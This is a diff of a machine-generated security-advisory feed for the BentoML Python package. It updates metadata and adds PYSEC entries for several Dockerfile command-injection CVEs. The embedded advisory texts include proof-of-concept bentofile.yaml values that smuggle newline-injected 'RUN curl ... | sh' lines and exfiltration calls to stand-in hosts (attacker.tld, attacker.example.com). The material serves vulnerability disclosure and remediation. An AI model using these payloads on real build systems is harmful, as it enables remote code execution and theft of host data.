@@ -4,7 +4,7 @@
   "purls": [
     "pkg:pypi/bentoml"
   ],
-  "generated_at": "2026-06-03T06:18:29+00:00",
+  "generated_at": "2026-06-09T06:01:34+00:00",
   "conda_versions_total": 35,
   "latest_version": "1.4.39",
   "advisories": [
@@ -110,7 +110,7 @@
           "conda_versions_total": 35,
           "affects_future": false,
           "derived_by": "purl-associator/scripts.cve_match",
-          "generated_at": "2026-06-03T06:18:29+00:00"
+          "generated_at": "2026-06-09T06:01:34+00:00"
         }
       },
       "severity": [
@@ -380,7 +380,7 @@
           "conda_versions_total": 35,
           "affects_future": false,
           "derived_by": "purl-associator/scripts.cve_match",
-          "generated_at": "2026-06-03T06:18:29+00:00"
+          "generated_at": "2026-06-09T06:01:34+00:00"
         }
       },
       "severity": [
@@ -711,7 +711,7 @@
           "conda_versions_total": 35,
           "affects_future": false,
           "derived_by": "purl-associator/scripts.cve_match",
-          "generated_at": "2026-06-03T06:18:29+00:00"
+          "generated_at": "2026-06-09T06:01:34+00:00"
         }
       },
       "severity": [
@@ -726,9 +726,10 @@
       "schema_version": "1.7.5",
       "id": "GHSA-78f9-r8mh-4xm2",
       "published": "2026-05-11T14:27:06Z",
-      "modified": "2026-05-11T14:49:58.100944Z",
+      "modified": "2026-06-09T00:00:24.171992237Z",
       "aliases": [
-        "CVE-2026-44345"
+        "CVE-2026-44345",
+        "PYSEC-2026-189"
       ],
       "summary": "BentoML Dockerfile command injection via docker.base_image (sister of pending GHSA-w2pm-x38x-jp44 / CVE-2026-33744 / CVE-2026-35043)",
       "details": "The same Dockerfile template that mishandles `envs[*].name` (pending GHSA-w2pm-x38x-jp44) also interpolates `docker.base_image` raw with no escaping, newline filtering, or validation. A malicious bento.yaml with a multi-line `docker.base_image` value smuggles arbitrary Dockerfile directives into the generated Dockerfile, and `bentoml containerize` then runs `docker build` which executes the injected `RUN` directives on the victim host.\n\n## Vulnerable code\n\n`src/bentoml/_internal/container/frontend/dockerfile/templates/base_v2.j2:38` (current main, 2026-04-28):\n\n```jinja\nFROM {{ __options__base_image }} AS base-container\n```\n\n`__options__base_image` resolves to `DockerOptions.base_image` (`src/bentoml/_internal/bento/build_config.py:176`):\n\n```python\nbase_image: t.Optional[str] = None\n```\n\nNo `validator`, no `converter`, no newline check. The value is loaded straight from `bento.yaml` in `src/bentoml/_internal/container/__init__.py:206` via `DockerOptions(**docker_attrs)` and rendered as-is.\n\n## PoC\n\nMalicious `bentofile.yaml`:\n\n```yaml\ndocker:\n  base_image: |\n    python:3.10\n    RUN curl https://attacker.tld/x.sh | sh\n    FROM scratch\n```\n\nMinimal reproduction of the unsafe interpolation:\n\n```python\nfrom jinja2 import Environment\nenv = Environment()\nmalicious = 'python:3.10\\nRUN curl https://attacker.tld/x.sh | sh\\nFROM scratch'\nout = env.from_string('FROM {{ __options__base_image }} AS base-container').render(__options__base_image=malicious)\nprint(out)\n```\n\nOutput:\n\n```\nFROM python:3.10\nRUN curl https://attacker.tld/x.sh | sh\nFROM scratch AS base-container\n```\n\nThree valid Dockerfile directives instead of one. The `RUN curl` executes during `docker build`. The trailing `FROM scratch AS base-container` provides the named build stage the rest of the template depends on, so the build proceeds without error.\n\n## Impact\n\nIdentical to GHSA-w2pm-x38x-jp44: arbitrary command execution on the victim's host during `bentoml containerize` of an attacker-supplied bento. Threat model is bento sharing (registry, marketplace, supply-chain handoff). The victim expects `docker.base_image` to be a Docker image reference, not a Dockerfile fragment.\n\n## Suggested fix\n\nValidate `DockerOptions.base_image` at the config layer: reject any value containing newline characters (`\\n`, `\\r`) or whitespace beyond a single space-separated tag. A regex like `^[A-Za-z0-9._/-]+(:[A-Za-z0-9._-]+)?(@sha256:[a-f0-9]{64})?$` covers the practical Docker reference format.\n\nThe same hardening should be extended to other unvalidated fields interpolated raw in `base_v2.j2`:\n\n* `__options__build_include[*]` at line 97 (`COPY ... ./src/{{ name }} ./src/{{ name }}`) \u2014 same newline-injection class for path entries from `Image.build_include(*file_paths)`.\n* `bento__user`, `bento__uid_gid`, `bento__path`, `bento__home`, `bento__entrypoint` \u2014 currently sourced from server-side defaults but should be defended in depth if they ever become user-overridable through `override_bento_env`.\n\n## References\n\n* Pending sibling: GHSA-w2pm-x38x-jp44 (envs[*].name), itself a sibling-fix-bypass of CVE-2026-33744 / CVE-2026-35043.\n* CWE-78: https://cwe.mitre.org/data/definitions/78.html",
@@ -988,8 +989,16 @@
           "url": "https://github.com/bentoml/BentoML/security/advisories/GHSA-w2pm-x38x-jp44"
         },
         {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44345"
+        },
+        {
           "type": "PACKAGE",
           "url": "https://github.com/bentoml/BentoML"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/bentoml/PYSEC-2026-189.yaml"
         }
       ],
       "database_specific": {
@@ -998,7 +1007,7 @@
         ],
         "github_reviewed": true,
         "github_reviewed_at": "2026-05-11T14:27:06Z",
-        "nvd_published_at": null,
+        "nvd_published_at": "2026-05-27T18:16:23Z",
         "severity": "HIGH",
         "conda-forge": {
           "package": "bentoml",
@@ -1045,7 +1054,7 @@
           "conda_versions_total": 35,
           "affects_future": false,
           "derived_by": "purl-associator/scripts.cve_match",
-          "generated_at": "2026-06-03T06:18:29+00:00"
+          "generated_at": "2026-06-09T06:01:34+00:00"
         }
       },
       "severity": [
@@ -1273,7 +1282,7 @@
           "conda_versions_total": 35,
           "affects_future": false,
           "derived_by": "purl-associator/scripts.cve_match",
-          "generated_at": "2026-06-03T06:18:29+00:00"
+          "generated_at": "2026-06-09T06:01:34+00:00"
         }
       },
       "severity": [
@@ -1572,7 +1581,7 @@
           "conda_versions_total": 35,
           "affects_future": false,
           "derived_by": "purl-associator/scripts.cve_match",
-          "generated_at": "2026-06-03T06:18:29+00:00"
+          "generated_at": "2026-06-09T06:01:34+00:00"
         }
       },
       "severity": [
@@ -1587,7 +1596,7 @@
       "schema_version": "1.7.5",
       "id": "GHSA-fgv4-6jr3-jgfw",
       "published": "2026-04-03T22:03:22Z",
-      "modified": "2026-05-20T11:56:23.949342443Z",
+      "modified": "2026-06-08T20:15:16.622817203Z",
       "aliases": [
         "CVE-2026-35043",
         "PYSEC-2026-158"
@@ -1855,6 +1864,10 @@
         {
           "type": "PACKAGE",
           "url": "https://github.com/bentoml/BentoML"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/bentoml/PYSEC-2026-158.yaml"
         }
       ],
       "database_specific": {
@@ -1909,7 +1922,7 @@
           "conda_versions_total": 35,
           "affects_future": false,
           "derived_by": "purl-associator/scripts.cve_match",
-          "generated_at": "2026-06-03T06:18:29+00:00"
+          "generated_at": "2026-06-09T06:01:34+00:00"
         }
       },
       "severity": [
@@ -2179,7 +2192,7 @@
           "conda_versions_total": 35,
           "affects_future": false,
           "derived_by": "purl-associator/scripts.cve_match",
-          "generated_at": "2026-06-03T06:18:29+00:00"
+          "generated_at": "2026-06-09T06:01:34+00:00"
         }
       },
       "severity": [
@@ -2409,7 +2422,7 @@
           "conda_versions_total": 35,
           "affects_future": false,
           "derived_by": "purl-associator/scripts.cve_match",
-          "generated_at": "2026-06-03T06:18:29+00:00"
+          "generated_at": "2026-06-09T06:01:34+00:00"
         }
       },
       "severity": [
@@ -2709,7 +2722,7 @@
           "conda_versions_total": 35,
           "affects_future": false,
           "derived_by": "purl-associator/scripts.cve_match",
-          "generated_at": "2026-06-03T06:18:29+00:00"
+          "generated_at": "2026-06-09T06:01:34+00:00"
         }
       },
       "severity": [
@@ -2724,7 +2737,7 @@
       "schema_version": "1.7.5",
       "id": "GHSA-jfjg-vc52-wqvf",
       "published": "2026-03-26T07:32:44Z",
-      "modified": "2026-05-20T11:56:02.713553421Z",
+      "modified": "2026-06-08T20:15:16.553484510Z",
       "aliases": [
         "CVE-2026-33744",
         "PYSEC-2026-157"
@@ -2987,6 +3000,10 @@
         {
           "type": "PACKAGE",
           "url": "https://github.com/bentoml/BentoML"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/bentoml/PYSEC-2026-157.yaml"
         }
       ],
       "database_specific": {
@@ -3040,7 +3057,7 @@
           "conda_versions_total": 35,
           "affects_future": false,
           "derived_by": "purl-associator/scripts.cve_match",
-          "generated_at": "2026-06-03T06:18:29+00:00"
+          "generated_at": "2026-06-09T06:01:34+00:00"
         }
       },
       "severity": [
@@ -3372,7 +3389,7 @@
           "conda_versions_total": 35,
           "affects_future": false,
           "derived_by": "purl-associator/scripts.cve_match",
-          "generated_at": "2026-06-03T06:18:29+00:00"
+          "generated_at": "2026-06-09T06:01:34+00:00"
         }
       },
       "severity": [
@@ -3387,7 +3404,7 @@
       "schema_version": "1.7.5",
       "id": "GHSA-mcfx-4vc6-qgxv",
       "published": "2026-05-07T16:39:47Z",
-      "modified": "2026-05-07T16:54:07.504229Z",
+      "modified": "2026-06-08T23:30:17.682001940Z",
       "aliases": [
         "CVE-2026-40610"
       ],
@@ -3645,8 +3662,20 @@
           "url": "https://github.com/bentoml/BentoML/security/advisories/GHSA-mcfx-4vc6-qgxv"
         },
         {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-40610"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/bentoml/BentoML/commit/5fb7cd41f92e2a56b45391284cf15b9ac9963a1f"
+        },
+        {
           "type": "PACKAGE",
           "url": "https://github.com/bentoml/BentoML"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/bentoml/BentoML/releases/tag/v1.4.39"
         }
       ],
       "database_specific": {
@@ -3655,7 +3684,7 @@
         ],
         "github_reviewed": true,
         "github_reviewed_at": "2026-05-07T16:39:47Z",
-        "nvd_published_at": null,
+        "nvd_published_at": "2026-05-22T20:16:34Z",
         "severity": "MODERATE",
         "conda-forge": {
           "package": "bentoml",
@@ -3702,7 +3731,7 @@
           "conda_versions_total": 35,
           "affects_future": false,
           "derived_by": "purl-associator/scripts.cve_match",
-          "generated_at": "2026-06-03T06:18:29+00:00"
+          "generated_at": "2026-06-09T06:01:34+00:00"
         }
       },
       "severity": [
@@ -3717,7 +3746,7 @@
       "schema_version": "1.7.5",
       "id": "GHSA-v959-cwq9-7hr6",
       "published": "2026-04-03T23:14:15Z",
-      "modified": "2026-05-20T11:56:09.170675881Z",
+      "modified": "2026-06-08T20:15:13.378215544Z",
       "aliases": [
         "CVE-2026-35044",
         "PYSEC-2026-159"
@@ -3981,6 +4010,10 @@
         {
           "type": "PACKAGE",
           "url": "https://github.com/bentoml/BentoML"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/bentoml/PYSEC-2026-159.yaml"
         }
       ],
       "database_specific": {
@@ -4035,7 +4068,7 @@
           "conda_versions_total": 35,
           "affects_future": false,
           "derived_by": "purl-associator/scripts.cve_match",
-          "generated_at": "2026-06-03T06:18:29+00:00"
+          "generated_at": "2026-06-09T06:01:34+00:00"
         }
       },
       "severity": [
@@ -4050,9 +4083,10 @@
       "schema_version": "1.7.5",
       "id": "GHSA-w2pm-x38x-jp44",
       "published": "2026-05-11T14:27:37Z",
-      "modified": "2026-05-11T14:49:32.026716Z",
+      "modified": "2026-06-09T00:00:26.690114269Z",
       "aliases": [
-        "CVE-2026-44346"
+        "CVE-2026-44346",
+        "PYSEC-2026-190"
       ],
       "summary": "Dockerfile command injection via envs[*].name in bentofile.yaml (sibling fix-bypass of CVE-2026-33744 and CVE-2026-35043)",
       "details": "# BentoML `envs[*].name` Dockerfile command injection \u2014 sibling of CVE-2026-33744 / CVE-2026-35043\n\nA malicious `bentofile.yaml` containing a newline-injected value in `envs[*].name` produces unquoted `RUN` directives in the BentoML-generated Dockerfile. When the victim runs `bentoml containerize` on the imported bento, those `RUN` directives execute on the host during `docker build`. Verified end-to-end on `bentoml==1.4.38`.\n\n## Vulnerable code\n\n`src/bentoml/_internal/container/frontend/dockerfile/templates/base_v2.j2:71-73`:\n\n```jinja\n{% for env in __bento_envs__ %}\n{% set stage = env.stage | default(\"all\") -%}\n{% if stage != \"runtime\" -%}\nARG {{ env.name }}{% if env.value %}={{ env.value | bash_quote }}{% endif %}\nENV {{ env.name }}=${{ env.name }}\n{% endif -%}\n{% endfor %}\n```\n\n`env.value` is bash-quoted via the `bash_quote` filter, but **`env.name` is interpolated raw** with no escaping or newline filtering. The template is rendered by `_bentoml_impl/docker.generate_dockerfile` (the v2 SDK Docker generation path used by `bentoml containerize` for modern services).\n\n## Sibling relationship to existing CVEs\n\nThe earlier patches addressed the same Dockerfile-command-injection class for a different bentofile field:\n\n- **CVE-2026-33744 / GHSA-jfjg-vc52-wqvf** (2026-03-25): added `bash_quote` to `system_packages` interpolation in Dockerfile templates and `images.py`.\n- **CVE-2026-35043 / GHSA-fgv4-6jr3-jgfw** (2026-04-02): added `shlex.quote` to `system_packages` in the cloud deployment path (`_internal/cloud/deployment.py:1648`).\n\nBoth patches limit themselves to `system_packages`. The `envs[*].name` field is the same root-cause class (`bentofile.yaml` value flowing unquoted into a Dockerfile interpretation context) but was never included in the fix scope.\n\n## Reproduction\n\n```bash\npip install bentoml==1.4.38\npython verify_render.py\n```\n\nExpected:\n\n```\n[*] rendered Dockerfile size: 1789 bytes\n[*] injected RUN lines: 3\n    RUN curl -fsSL http://attacker.example.com/$(whoami)=1\n    RUN curl -fsSL http://attacker.example.com/$(whoami)=$FOO\n    RUN curl -fsSL http://attacker.example.com/$(whoami)\n```\n\nEach injected `RUN` line is a Dockerfile command that runs during `docker build`. With `$(whoami)` shell-substituted by Docker's RUN executor, the example payload exfiltrates the build host's username.\n\n## Threat model\n\n1. Attacker authors a malicious bento with a crafted `bentofile.yaml`.\n2. Attacker exports the bento (`.bento` or `.tar.gz`) and distributes (S3, HTTP, BentoCloud share, etc.).\n3. Victim imports with `bentoml import bento.tar`; no validation of `envs` content.\n4. Victim runs `bentoml containerize` to build the container image.\n5. BentoML renders the Dockerfile with the attacker's `envs` values, producing injected `RUN` lines.\n6. `docker build` (or BuildKit) executes the injected `RUN` commands on the build host, achieving RCE in the victim's build environment.\n\nThe flow mirrors CVE-2026-33744 exactly, with `envs` substituted for `system_packages`.\n\n## Suggested fix\n\nIn `base_v2.j2` lines 71-73, apply the `bash_quote` filter to `env.name` (and to the `=$VAR` reference in the `ENV` line, since the variable name itself is reused there):\n\n```jinja\nARG {{ env.name | bash_quote }}{% if env.value %}={{ env.value | bash_quote }}{% endif %}\nENV {{ env.name | bash_quote }}=${{ env.name | bash_quote }}\n```\n\nBetter, since `env.name` is semantically a Dockerfile identifier, validate at the schema level: in `bentoml/_internal/bento/build_config.py:BentoEnvSchema`, add an `attr.validators.matches_re(r\"^[A-Za-z_][A-Za-z0-9_]*$\")` to the `name` field so newline / shell-metacharacter values are rejected at config load.\n\n## Affected versions\n\n- bentoml 1.4.38 (verified end-to-end)\n- Likely all 1.x versions where `_bentoml_impl/docker.py` exists; the v2 SDK code path was added before the CVE-2026-33744 / CVE-2026-35043 patches and was not retroactively swept for siblings.\n\n## Disclosure\n\nRequesting CVE assignment and GHSA publication. Available for additional repro under different distros / frontends, or for a PR with the suggested fix, on request.\n\n\n## PoC artifacts\n\nGated HF repo (request access): https://huggingface.co/mrw0r57/bentoml-envs-cmdinjection-poc",
@@ -4312,8 +4346,16 @@
           "url": "https://github.com/bentoml/BentoML/security/advisories/GHSA-w2pm-x38x-jp44"
         },
         {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-44346"
+        },
+        {
           "type": "PACKAGE",
           "url": "https://github.com/bentoml/BentoML"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/bentoml/PYSEC-2026-190.yaml"
         }
       ],
       "database_specific": {
@@ -4323,7 +4365,7 @@
         ],
         "github_reviewed": true,
         "github_reviewed_at": "2026-05-11T14:27:37Z",
-        "nvd_published_at": null,
+        "nvd_published_at": "2026-05-27T18:16:23Z",
         "severity": "HIGH",
         "conda-forge": {
           "package": "bentoml",
@@ -4370,7 +4412,7 @@
           "conda_versions_total": 35,
           "affects_future": false,
           "derived_by": "purl-associator/scripts.cve_match",
-          "generated_at": "2026-06-03T06:18:29+00:00"
+          "generated_at": "2026-06-09T06:01:34+00:00"
         }
       },
       "severity": [
@@ -4578,7 +4620,7 @@
           "conda_versions_total": 35,
           "affects_future": false,
           "derived_by": "purl-associator/scripts.cve_match",
-          "generated_at": "2026-06-03T06:18:29+00:00"
+          "generated_at": "2026-06-09T06:01:34+00:00"
         }
       }
     },
@@ -4892,7 +4934,7 @@
           "conda_versions_total": 35,
           "affects_future": false,
           "derived_by": "purl-associator/scripts.cve_match",
-          "generated_at": "2026-06-03T06:18:29+00:00"
+          "generated_at": "2026-06-09T06:01:34+00:00"
         }
       }
     },
@@ -5208,7 +5250,7 @@
           "conda_versions_total": 35,
           "affects_future": false,
           "derived_by": "purl-associator/scripts.cve_match",
-          "generated_at": "2026-06-03T06:18:29+00:00"
+          "generated_at": "2026-06-09T06:01:34+00:00"
         }
       }
     },
@@ -5524,7 +5566,645 @@
           "conda_versions_total": 35,
           "affects_future": false,
           "derived_by": "purl-associator/scripts.cve_match",
-          "generated_at": "2026-06-03T06:18:29+00:00"
+          "generated_at": "2026-06-09T06:01:34+00:00"
+        }
+      }
+    },
+    {
+      "schema_version": "1.7.5",
+      "id": "PYSEC-2026-189",
+      "published": "2026-05-27T18:16:23.200Z",
+      "modified": "2026-06-03T12:45:16.765728316Z",
+      "aliases": [
+        "CVE-2026-44345",
+        "GHSA-78f9-r8mh-4xm2"
+      ],
+      "details": "BentoML is a Python library for building online serving systems optimized for AI apps and model inference. Prior to 1.4.39, src/bentoml/_internal/container/frontend/dockerfile/templates/base_v2.j2 interpolates docker.base_image raw with no escaping, newline filtering, or validation. A malicious bento.yaml with a multi-line docker.base_image value smuggles arbitrary Dockerfile directives into the generated Dockerfile, and bentoml containerize then runs docker build which executes the injected RUN directives on the victim host. This vulnerability is fixed in 1.4.39.",
+      "affected": [
+        {
+          "package": {
+            "name": "bentoml",
+            "ecosystem": "PyPI",
+            "purl": "pkg:pypi/bentoml"
+          },
+          "ranges": [
+            {
+              "type": "ECOSYSTEM",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "1.4.39"
+                }
+              ]
+            }
+          ],
+          "versions": [
+            "0.0.1",
+            "0.0.2",
+            "0.0.3",
+            "0.0.5",
+            "0.0.6a0",
+            "0.0.7",
+            "0.0.7.dev0",
+            "0.0.8",
+            "0.0.8.post1",
+            "0.0.9",
+            "0.1.1",
+            "0.1.2",
+            "0.10.0",
+            "0.10.1",
+            "0.11.0",
+            "0.11.dev0",
+            "0.12.0",
+            "0.12.1",
+            "0.13.0",
+            "0.13.1",
+            "0.13.2",
+            "0.2.0",
+            "0.2.1",
+            "0.2.2",
+            "0.3.0",
+            "0.3.1",
+            "0.3.3",
+            "0.3.4",
+            "0.4.0",
+            "0.4.1",
+            "0.4.2",
+            "0.4.3",
+            "0.4.4",
+            "0.4.5",
+            "0.4.7",
+            "0.4.8",
+            "0.4.9",
+            "0.5.0",
+            "0.5.1",
+            "0.5.2",
+            "0.5.3",
+            "0.5.4",
+            "0.5.5",
+            "0.5.6",
+            "0.5.7",
+            "0.5.8",
+            "0.6.0",
+            "0.6.1",
+            "0.6.2",
+            "0.6.3",
+            "0.7.0",
+            "0.7.1",
+            "0.7.2",
+            "0.7.3",
+            "0.7.4",
+            "0.7.5",
+            "0.7.6",
+            "0.7.7",
+            "0.7.8",
+            "0.8.0",
+            "0.8.1",
+            "0.8.2",
+            "0.8.3",
+            "0.8.4",
+            "0.8.5",
+            "0.8.6",
+            "0.9.0",
+            "0.9.0rc0",
+            "0.9.1",
+            "0.9.2",
+            "1.0.0",
+            "1.0.0.dev0",
+            "1.0.0.dev1",
+            "1.0.0a1",
+            "1.0.0a2",
+            "1.0.0a3",
+            "1.0.0a4",
+            "1.0.0a5",
+            "1.0.0a6",
+            "1.0.0a7",
+            "1.0.0rc0",
+            "1.0.0rc1",
+            "1.0.0rc2",
+            "1.0.0rc3",
+            "1.0.10",
+            "1.0.11",
+            "1.0.12",
+            "1.0.13",
+            "1.0.14",
+            "1.0.15",
+            "1.0.16",
+            "1.0.17",
+            "1.0.18",
+            "1.0.19",
+            "1.0.2",
+            "1.0.20",
+            "1.0.21",
+            "1.0.22",
+            "1.0.23",
+            "1.0.24",
+            "1.0.25",
+            "1.0.3",
+            "1.0.4",
+            "1.0.5",
+            "1.0.6",
+            "1.0.7",
+            "1.0.8",
+            "1.0.9",
+            "1.1.0",
+            "1.1.1",
+            "1.1.10",
+            "1.1.11",
+            "1.1.2",
+            "1.1.3",
+            "1.1.4",
+            "1.1.5",
+            "1.1.6",
+            "1.1.7",
+            "1.1.8",
+            "1.1.9",
+            "1.2.0",
+            "1.2.0a0",
+            "1.2.0a1",
+            "1.2.0a2",
+            "1.2.0a3",
+            "1.2.0a4",
+            "1.2.0a5",
+            "1.2.0a6",
+            "1.2.0a7",
+            "1.2.0rc1",
+            "1.2.1",
+            "1.2.10",
+            "1.2.11",
+            "1.2.12",
+            "1.2.13",
+            "1.2.14",
+            "1.2.15",
+            "1.2.16",
+            "1.2.17",
+            "1.2.18",
+            "1.2.19",
+            "1.2.1a1",
+            "1.2.2",
+            "1.2.20",
+            "1.2.3",
+            "1.2.4",
+            "1.2.5",
+            "1.2.6",
+            "1.2.7",
+            "1.2.8",
+            "1.2.9",
+            "1.3.0",
+            "1.3.0a1",
+            "1.3.0a2",
+            "1.3.0a3",
+            "1.3.1",
+            "1.3.10",
+            "1.3.11",
+            "1.3.12",
+            "1.3.13",
+            "1.3.14",
+            "1.3.15",
+            "1.3.16",
+            "1.3.17",
+            "1.3.18",
+            "1.3.19",
+            "1.3.2",
+            "1.3.20",
+            "1.3.21",
+            "1.3.22",
+            "1.3.3",
+            "1.3.4.post1",
+            "1.3.5",
+            "1.3.6",
+            "1.3.7",
+            "1.3.8",
+            "1.3.9",
+            "1.4.0",
+            "1.4.0a1",
+            "1.4.0a2",
+            "1.4.1",
+            "1.4.10",
+            "1.4.11",
+            "1.4.12",
+            "1.4.13",
+            "1.4.14",
+            "1.4.15",
+            "1.4.16",
+            "1.4.17",
+            "1.4.18",
+            "1.4.19",
+            "1.4.2",
+            "1.4.20",
+            "1.4.21",
+            "1.4.22",
+            "1.4.23",
+            "1.4.24",
+            "1.4.25",
+            "1.4.26",
+            "1.4.27",
+            "1.4.28",
+            "1.4.29",
+            "1.4.3",
+            "1.4.30",
+            "1.4.31",
+            "1.4.32",
+            "1.4.33",
+            "1.4.34",
+            "1.4.35",
+            "1.4.36",
+            "1.4.37",
+            "1.4.38",
+            "1.4.4",
+            "1.4.5",
+            "1.4.6",
+            "1.4.7",
+            "1.4.8",
+            "1.4.9"
+          ],
+          "ecosystem_specific": {},
+          "database_specific": {
+            "source": "https://github.com/pypa/advisory-database/blob/main/vulns/bentoml/PYSEC-2026-189.yaml"
+          }
+        }
+      ],
+      "references": [
+        {
+          "type": "EVIDENCE",
+          "url": "https://github.com/bentoml/BentoML/security/advisories/GHSA-78f9-r8mh-4xm2"
+        }
+      ],
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+          "score_num": 8.8
+        }
+      ],
+      "database_specific": {
+        "conda-forge": {
+          "package": "bentoml",
+          "purl": "pkg:conda/bentoml?channel=conda-forge",
+          "source_purls": [
+            "pkg:pypi/bentoml"
+          ],
+          "affected_versions": [
+            "0.13.1",
+            "1.0.0",
+            "1.1.1",
+            "1.1.10",
+            "1.1.11",
+            "1.2.0",
+            "1.2.1",
+            "1.2.2",
+            "1.2.3",
+            "1.2.4",
+            "1.2.5",
+            "1.2.6",
+            "1.2.7",
+            "1.2.8",
+            "1.2.9",
+            "1.2.11",
+            "1.2.12",
+            "1.2.13",
+            "1.2.14",
+            "1.2.15",
+            "1.2.16",
+            "1.2.17",
+            "1.2.19",
+            "1.2.20",
+            "1.3.18",
+            "1.4.30",
+            "1.4.31",
+            "1.4.32",
+            "1.4.33",
+            "1.4.34",
+            "1.4.35",
+            "1.4.36",
+            "1.4.37",
+            "1.4.38"
+          ],
+          "conda_versions_total": 35,
+          "affects_future": false,
+          "derived_by": "purl-associator/scripts.cve_match",
+          "generated_at": "2026-06-09T06:01:34+00:00"
+        }
+      }
+    },
+    {
+      "schema_version": "1.7.5",
+      "id": "PYSEC-2026-190",
+      "published": "2026-05-27T18:16:23.333Z",
+      "modified": "2026-06-03T12:45:16.305395286Z",
+      "aliases": [
+        "CVE-2026-44346",
+        "GHSA-w2pm-x38x-jp44"
+      ],
+      "details": "BentoML is a Python library for building online serving systems optimized for AI apps and model inference. Prior to 1.4.39, a malicious bentofile.yaml containing a newline-injected value in envs[*].name produces unquoted RUN directives in the BentoML-generated Dockerfile. When the victim runs bentoml containerize on the imported bento, those RUN directives execute on the host during docker build. This vulnerability is fixed in 1.4.39.",
+      "affected": [
+        {
+          "package": {
+            "name": "bentoml",
+            "ecosystem": "PyPI",
+            "purl": "pkg:pypi/bentoml"
+          },
+          "ranges": [
+            {
+              "type": "ECOSYSTEM",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "1.4.39"
+                }
+              ]
+            }
+          ],
+          "versions": [
+            "0.0.1",
+            "0.0.2",
+            "0.0.3",
+            "0.0.5",
+            "0.0.6a0",
+            "0.0.7",
+            "0.0.7.dev0",
+            "0.0.8",
+            "0.0.8.post1",
+            "0.0.9",
+            "0.1.1",
+            "0.1.2",
+            "0.10.0",
+            "0.10.1",
+            "0.11.0",
+            "0.11.dev0",
+            "0.12.0",
+            "0.12.1",
+            "0.13.0",
+            "0.13.1",
+            "0.13.2",
+            "0.2.0",
+            "0.2.1",
+            "0.2.2",
+            "0.3.0",
+            "0.3.1",
+            "0.3.3",
+            "0.3.4",
+            "0.4.0",
+            "0.4.1",
+            "0.4.2",
+            "0.4.3",
+            "0.4.4",
+            "0.4.5",
+            "0.4.7",
+            "0.4.8",
+            "0.4.9",
+            "0.5.0",
+            "0.5.1",
+            "0.5.2",
+            "0.5.3",
+            "0.5.4",
+            "0.5.5",
+            "0.5.6",
+            "0.5.7",
+            "0.5.8",
+            "0.6.0",
+            "0.6.1",
+            "0.6.2",
+            "0.6.3",
+            "0.7.0",
+            "0.7.1",
+            "0.7.2",
+            "0.7.3",
+            "0.7.4",
+            "0.7.5",
+            "0.7.6",
+            "0.7.7",
+            "0.7.8",
+            "0.8.0",
+            "0.8.1",
+            "0.8.2",
+            "0.8.3",
+            "0.8.4",
+            "0.8.5",
+            "0.8.6",
+            "0.9.0",
+            "0.9.0rc0",
+            "0.9.1",
+            "0.9.2",
+            "1.0.0",
+            "1.0.0.dev0",
+            "1.0.0.dev1",
+            "1.0.0a1",
+            "1.0.0a2",
+            "1.0.0a3",
+            "1.0.0a4",
+            "1.0.0a5",
+            "1.0.0a6",
+            "1.0.0a7",
+            "1.0.0rc0",
+            "1.0.0rc1",
+            "1.0.0rc2",
+            "1.0.0rc3",
+            "1.0.10",
+            "1.0.11",
+            "1.0.12",
+            "1.0.13",
+            "1.0.14",
+            "1.0.15",
+            "1.0.16",
+            "1.0.17",
+            "1.0.18",
+            "1.0.19",
+            "1.0.2",
+            "1.0.20",
+            "1.0.21",
+            "1.0.22",
+            "1.0.23",
+            "1.0.24",
+            "1.0.25",
+            "1.0.3",
+            "1.0.4",
+            "1.0.5",
+            "1.0.6",
+            "1.0.7",
+            "1.0.8",
+            "1.0.9",
+            "1.1.0",
+            "1.1.1",
+            "1.1.10",
+            "1.1.11",
+            "1.1.2",
+            "1.1.3",
+            "1.1.4",
+            "1.1.5",
+            "1.1.6",
+            "1.1.7",
+            "1.1.8",
+            "1.1.9",
+            "1.2.0",
+            "1.2.0a0",
+            "1.2.0a1",
+            "1.2.0a2",
+            "1.2.0a3",
+            "1.2.0a4",
+            "1.2.0a5",
+            "1.2.0a6",
+            "1.2.0a7",
+            "1.2.0rc1",
+            "1.2.1",
+            "1.2.10",
+            "1.2.11",
+            "1.2.12",
+            "1.2.13",
+            "1.2.14",
+            "1.2.15",
+            "1.2.16",
+            "1.2.17",
+            "1.2.18",
+            "1.2.19",
+            "1.2.1a1",
+            "1.2.2",
+            "1.2.20",
+            "1.2.3",
+            "1.2.4",
+            "1.2.5",
+            "1.2.6",
+            "1.2.7",
+            "1.2.8",
+            "1.2.9",
+            "1.3.0",
+            "1.3.0a1",
+            "1.3.0a2",
+            "1.3.0a3",
+            "1.3.1",
+            "1.3.10",
+            "1.3.11",
+            "1.3.12",
+            "1.3.13",
+            "1.3.14",
+            "1.3.15",
+            "1.3.16",
+            "1.3.17",
+            "1.3.18",
+            "1.3.19",
+            "1.3.2",
+            "1.3.20",
+            "1.3.21",
+            "1.3.22",
+            "1.3.3",
+            "1.3.4.post1",
+            "1.3.5",
+            "1.3.6",
+            "1.3.7",
+            "1.3.8",
+            "1.3.9",
+            "1.4.0",
+            "1.4.0a1",
+            "1.4.0a2",
+            "1.4.1",
+            "1.4.10",
+            "1.4.11",
+            "1.4.12",
+            "1.4.13",
+            "1.4.14",
+            "1.4.15",
+            "1.4.16",
+            "1.4.17",
+            "1.4.18",
+            "1.4.19",
+            "1.4.2",
+            "1.4.20",
+            "1.4.21",
+            "1.4.22",
+            "1.4.23",
+            "1.4.24",
+            "1.4.25",
+            "1.4.26",
+            "1.4.27",
+            "1.4.28",
+            "1.4.29",
+            "1.4.3",
